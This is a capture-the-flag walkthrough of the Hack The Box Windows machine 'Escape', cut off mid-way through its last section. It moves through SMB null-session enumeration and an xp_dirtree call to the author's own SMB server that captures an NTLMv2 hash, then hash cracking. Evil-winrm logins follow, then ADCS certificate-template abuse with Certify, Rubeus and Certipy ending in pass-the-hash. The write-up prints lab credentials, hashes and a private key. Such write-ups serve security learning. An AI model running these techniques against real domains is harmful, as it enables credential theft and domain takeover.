---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: smb crackmapexec impacket-smbserver impacket nullsession openssl smbclient mssqlclient.py mssql sql ntlmv2 hash john  
---

<br />

![1](../../../assets/images/Escape/1.png)

<br />

OS -> Windows.

Difficulty -> Medium.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.11.202 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 20:12 CEST
Nmap scan report for 10.10.11.202
Host is up (0.051s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-03 02:11:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m15s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m14s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-03T00:42:02
|_Not valid after:  2055-05-03T00:42:02
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m15s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49752/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-03T02:12:47
|_  start_date: N/A
|_clock-skew: mean: 7h58m14s, deviation: 0s, median: 7h58m13s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.36 seconds
```

<br />

Relevant Open Ports:

- `Port 53`   -> dns  

- `Port 88`   -> kerberos  

- `Port 135`  -> rpc  

- `Port 139`  -> netbios  

- `Port 389`  -> ldap  

- `Port 445`  -> smb  

- `Port 464`  -> kpasswd (kerberos password change)  

- `Port 593`  -> rpc over http  

- `Port 636`  -> ldaps  

- `Port 1433` -> mssql  

- `Port 5985` -> winrm  

<br />

The Nmap script shows that the LDAP service reveals the domain name `sequel.htb` and the TLS certificate `dc.sequel.htb`.

So we add them to our `/etc/hosts` file:

<br />

```bash
10.10.11.202 sequel.htb dc.sequel.htb
```

<br />

# TLS Certificate: Port -> 3269

<br />

Let's inspect the `TLS` certificate using `openssl` to check for any relevant information:

<br />

```bash
---
Server certificate
subject=
issuer=DC = htb, DC = sequel, CN = sequel-DC-CA
---
```

<br />

The only noteworthy detail in the output is the `CA` certificate name: `sequel-DC-CA`.

<br />

# SMB Enumeration: Port -> 445

<br />

To gather additional system information, we'll start with a classic [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) oneliner:

<br />

```bash
❯ crackmapexec smb 10.10.11.202
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

<br />

As seen in the output, the host is running  Windows 10 (Build 17763), and we confirm the domain name: `sequel.htb`

<br />

Next, we attempt a `null session` (empty password) to enumerate shared resources over `SMB`:

<br />

```bash
❯ crackmapexec smb 10.10.11.202 -u 'fakeuser' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\fakeuser: 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

<br />

Great! The `Public` share is not a default folder, and we have `READ` access to it.

While enumerating this folder with `smbclient` we found an interesting SQL pdf:

<br />

```bash
❯ smbclient //10.10.11.202/Public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

		5184255 blocks of size 4096. 1465497 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (177,9 KiloBytes/sec) (average 177,9 KiloBytes/sec)
```

<br />

We download the file using `get` and open it locally for further analysis:

<br />

```bash
open "SQL Server Procedures.pdf"
```

<br />

![2](../../../assets/images/Escape/2.png)

<br />

At the end of the PDF, we have discovered some potentially useful `SQL` credentials: `PublicUser:GuestUserCantWrite1`

They are mentioned in the following excerpt:

<br />

```bash
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

<br />

These credentials do not grant access to any SMB shares.

<br />

# MSSQL Enumeration: Port -> 1433

<br />

As noted earlier, the machine is hosting a `SQL Server`.

With these credentials, and using the [Impacket](https://github.com/fortra/impacket) tool `mssqlclient.py`, we can log in:

<br />

```bash
❯ mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

<br />

We can list four `databases` on the server (default MSSQL databases):

<br />

```bash
SQL (PublicUser  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1
```

<br />

### xp_cmdshell:

<br />

When we are inside a MSSQL server, we can try to activate the `xp_cmdshell`.

A function that allows us to run commands on the system.

However, in this case, we don't have the necessary permissions:

<br />

```bash
SQL (PublicUser  guest@master)> enable_xp_cmdshell
[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
<[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
```

<br />

We also tried to execute a command directly using `xp_cmdshell`, but without success:

<br />

```bash
SQL (PublicUser  guest@master)> xp_cmdshell whoami
[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

<br />

## Get NTLMv2 Hash:

<br />

Another technique we can leverage on the MSSQL server is the use of the `xp_dirtree` function.

This function allows us to retrieve a `directory listing` from the file system.

What's particularly interesting is that if we point it to a network path hosted by an `Impacket` server running on our machine, we might be able to capture the `NTLM` hash of the user executing the query on the target system.

First, we host the server using `impacket-server`:

<br />

```bash
❯ impacket-smbserver Folder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

<br />

Then, we run `xp_dirtree` pointing to our server:

<br />

```bash
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.22\Folder
subdirectory   depth   file
------------   -----   ----
```

<br />

And we check the impacket-server output:

<br />

```bash
❯ impacket-smbserver Folder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,55308)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:a47f2bd3187c0730f2b6f55794322452:0101000000000000804931a638bcdb01db5166ebaa9fe9900000000001001000770067004f0049004b0052004500540003001000770067004f0049004b00520045005400020010006b00560064004500470063006c006100040010006b00560064004500470063006c00610007000800804931a638bcdb010600040002000000080030003000000000000000000000000030000029c82ea33e7042d6719019b8a652da06691eb0d187880fc1f18597c4f97d3b040a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000
[*] Closing down connection (10.10.11.202,55308)
[*] Remaining connections []
```

<br />

Success! We have captured an `NTLMv2` hash from the user `sql_svc`.

Now, let's try to crack it using `john`:

<br />

```bash
❯ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
...[snip]...

```

<br />

We successfully cracked the hash and retrieved valid credentials: `sql_svc:REGGIE1234ronnie`

<br />

### WinRM:

<br />

With these credentials, we use `evil-winrm` to gain access to the system:

<br />

```bash
❯ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```

<br />

# Privilege Escalation: sql_svc -> Ryan.Cooper

<br />

The `sql_svc` user's directory is empty.

However, there is another user profile on the system: `Ryan.Cooper`

<br />

```bash
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```

<br />

### ERRORLOG.BAK:

<br />

While enumerating the system, we found an unusual directory on `C:\`, named `SQLServer`:

<br />

```bash
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
```

<br />

Inside it, there are some files and a subdirectory named `Logs`:

<br />

```bash
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
```

<br />

Within that folder, we found an error log file: `ERRORLOG.BAK`

<br />

```bash
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

<br />

Upon inspecting the contents of this file, we found potential credentials: `Ryan.Cooper:NuclearMosquito3`

<br />

```bash
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
```

<br />

Using these credentials, we can pivot to the `Ryan.Cooper` account and retrieve the `user.txt` flag:

<br />

```bash
❯ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
d94615721bdc257a6576b20fbbxxxxxx
```

<br />

# Privilege Escalation: Ryan.Cooper -> NT AUTHORITY\SYSTEM

<br />

### ADCS:

<br />

One of the things we should always check is the presence of `ADCS` (Active Directory Certificate Services).

<br />

To do this, we'll upload the [Certify.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) binary:

<br />

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload certify.exe
                                        
Info: Uploading /opt/certify.exe to C:\Users\Ryan.Cooper\Desktop\certify.exe
                                        
Data: 232104 bytes of 232104 bytes copied
                                        
Info: Upload successful!
```

<br />

Then, we execute it to look for vulnerable certificate templates:

<br />

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\certify.exe find /vulnerable
```

<br />

The output reveals valuable information, including a vulnerable certificate template:

<br />

```bash
[!] Vulnerable Certificate Templates:

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights                 : sequel\Domain Admins
                                            sequel\Domain Users
                                            sequel\Enterprise Admins
```

<br />

Perfect! We’ve identified a vulnerable certificate template named `UserAuthentication`.

<br />

## Abusing Template

<br />

There are several ways to abuse this template — we’ll cover the main ones.

<br />

### 1st Option - Certify/Rubeus:

<br />

To exploit this, we can continue reading the [README.md](https://github.com/GhostPack/Certify) of Certify, following the scenario 3 steps.

First, we request a certificate impersonating the user `administrator`, which generates a `cert.pem` file:

<br />

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
...[snip]...
[*] CA Response             : The certificate had been issued.
[*] Request ID              : 14

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvZ0KC7HHgAgSGWl0oUw5p4kiHINgl53kWQH0LACfR7vjuFa5
05iojEY1Sxh1kZpxdTmbSSSkFZk/2ussf78CPK83XKh5zXCPuL59dlFWtQXdFzKN
cswquFzwhpthJ/w9fZzXO8bZA/CAanKH8e1/nos5To6BR7bLUVK6T/o84MyT9YsN
V0WOijUVTfGMtOeCQrZI0zHOJJuNrxAqx+OEtBD/lw3hQy3qhXHHbo0GbsCAu0uU
0918mAZNEIc4AYYG6TL6veMClU+BFrQKcFhCULn2G0oEuHgZDruGj2yaqS/8Tw7N
dl4Hrdfbz44SKBEm/JH70B89wvPPkat6n9S4iQIDAQABAoIBABl3V/wOGn9Flji3
gySOukeYEW7G7lguqpaRvpuSUdIul/0QGNEkda6xV0MIu/GcTpSx8fs24prMBFmA
sG9P1hsUZVkaf5FqBsOHQg58Cisx6GnPLlQ2u54bTWqmv7vBEvkl8Xpj0I3I5VZm
n3+MqFFA3aeBWDerg08ez0sijr6aP+2Yz8JKxa4CJmHTbwWGRomKxe9bR+EAG3AJ
V/EziHqFgGWSyDs0Cgwm3eS7/By+xwCrfRsAgIGkCYPlEZ3cet0NPNRgazYGKUK4
TFVqTpas7Pkr10XQShaAlZLIEyM2BsKxPTQ4LxEBPMcwarIHxBHgRP6cIc3PdkVD
+BT0yakCgYEAyNftD58jPubh8MyYJmxiduECEoHkjMc1OGJJxSSe3IoI9Lxe6zCR
74E/mcv7zhkR7/TbziG2JoJ3agE2HoLL/oxzvbvqazRD8eGaZH7ufGy2rLZosErX
sL6SJ44bxb8ZG8k4vWs/3EDz8SjCazMojICTQWN25RaHJ/S4MEKwVX8CgYEA8a+Z
TFTEQNcob3w8WUioD2aNUAY6mv6V2B3tMjNs3Fb/DsdHbUK09Oczkq979sHoZHd8
z/0WExHgslEHw2DiJd4NiWTwDXLOCa9TQz0/E7/2YivLCc7WzEgsRv/89HZqlR2K
Nr3Fe7i7unm8/z5ctH8CisI/v0jcc9Jme7jZRfcCgYAW+BLFcZavT+pRBqTz5/tO
yybYhQBlVTbx7tOu9yQv5p1ll9FnJlPaRzbF2P1AMb/KaH9m0JYrS0pq1h6hWKYJ
w3hNH5uMjRqkI//rNFUD587wa6AHYVfPf8vpOChW8ibl9ZpGl2hjQQ5k6xto9R3T
C7VLihuD0ZK9cBBMfKP78wKBgGgu9RtVcyAsX67nVDB8xI2W/JWhicPkuP1nsScx
ydyV1+8r8ltkJRNpUu8JnJt7bU1ZwMD77Xcc/sp/aaRMcFA4j4dJrr1tXuoH3RGg
Jj/CQViCXk0FD80R05xrn0RWg41yJXGBjs7NjIdPESzKWjYohhUAtXAk3XtEGI9+
2JJzAoGAI3KNUjiIJgi1ItRXPjVaynrHxstqcjqz90ii6LS4FYsg1cVvRwNquEG4
8ULxRsGb3v5k0hN5mhdtFu4TDVX9ZrBHu57S0d1cZYLMV/FkvMdUkgrcGv55ObFP
W/ry9u7vtRfDoUV7Dz9kBwMg36LaQjQ3hYhvpodCHvXUWnhwC5s=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA40+bBZUvmKfwAAAAAADjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUwNTA0MTc0MTU5WhcNMzUwNTAy
MTc0MTU5WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9nQoLsceACBIZaXShTDmniSIc
g2CXneRZAfQsAJ9Hu+O4VrnTmKiMRjVLGHWRmnF1OZtJJKQVmT/a6yx/vwI8rzdc
qHnNcI+4vn12UVa1Bd0XMo1yzCq4XPCGm2En/D19nNc7xtkD8IBqcofx7X+eizlO
joFHtstRUrpP+jzgzJP1iw1XRY6KNRVN8Yy054JCtkjTMc4km42vECrH44S0EP+X
DeFDLeqFccdujQZuwIC7S5TT3XyYBk0QhzgBhgbpMvq94wKVT4EWtApwWEJQufYb
SgS4eBkOu4aPbJqpL/xPDs12Xget19vPjhIoESb8kfvQHz3C88+Rq3qf1LiJAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFENxayoMC/58q2Ek8/g6GbzVpPQX
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAeuaDXsTUKZUiAhYBCNSTwRlRKocEEsoWz7VbbMHhe4tXPg9nSwXNH8gA
lUPs2agbt3qtJgUyUR0qI4bnyLo6BzX3IRCvjfvN7ENlOlIaE+tOrw8akWkxMwc/
QT6Fbv7/IATDjXe0nOm7VUm9maE571gfnb57451wSb6j+FuA+zxmtblflezz2DHI
CWOznRXOeYCXlPVoAoA1uvr4zaAnBcWdmdLgX1zv7uhIbxRD1s5+EIFSDDyBZjsK
langBG/tIYP8dVcBt8kY0/3ob78OlEYUrs4oSifQAtxpvX29yk/QqmXoT610/Vbt
Pvj3Kg2e7YKZAECtDCR9N5Ji5p7sQA==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

<br />

Once we obtain the certificate, we save the block from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a `cert.pem` file on our local machine.

<br />

```bash
❯ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
❯ ls
󰌆 cert.pem   cert.pfx
```

<br />

Then, we upload the `cert.pfx` and [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) to the victim machine:

<br />

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload cert.pfx
                                        
Info: Uploading /opt/cert.pfx to C:\Users\Ryan.Cooper\Desktop\cert.pfx
                                        
Data: 4544 bytes of 4544 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload Rubeus.exe
                                        
Info: Uploading /opt/Rubeus.exe to C:\Users\Ryan.Cooper\Desktop\Rubeus.exe
                                        
Data: 595968 bytes of 595968 bytes copied
                                        
Info: Upload successful!
```

<br />

Finally, we only need to run this `asktgt` command to request a `TGT` for the administrator user:

<br />

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Rubeus.exe asktgt /user:administrator /certificate:C:cert.pfx

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::7d5e:1149:d46d:bfe3%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBAlk/wmjAbNi
      11uw74e4Qt0bcGB5iABgW9aRyObC44xm3nQOg9htodHtH8ruQq09csOBAdRgEJHyr6ojVwdMraRpRnds
...[snip]...
```

<br />

It works! However, if we try to enter administrator folder and get the root.txt flag, we don't have permissions to do it.

To solve this, we can get the NTLM hash of the administrator user adding the following flags to our `asktgt` command:

<br />

- `/getcredentials`

- `/show`

- `/nowrap`

<br />

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Rubeus.exe asktgt /user:administrator /certificate:C:cert.pfx /getcredentials /show /nowrap
...[snip]...
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

<br />

After doing this, we can use this `NTLM` hash to gain access as administrator using `Evil-WinRM`:

<br />

```bash
❯ evil-winrm -i 10.10.11.202 -u 'administrator' -H "A52F78E4C751E5F5E17E1E9F3E58F4EE"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
74a7c073ecbc149ea6400ac4bbxxxxxx
```

<br />

## 2nd Option - Certipy:

<br />

Another way to exploit this vulnerability is by using [Certipy](https://github.com/ly4k/Certipy).

This tool is also very powerful, and the main difference compared to `Certify.exe` is that `Certipy` can be used directly from our local Linux machine.

We start detecting the vulnerable certificate template, such as `Certify.exe`:

<br />

```bash
...[snip]...
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
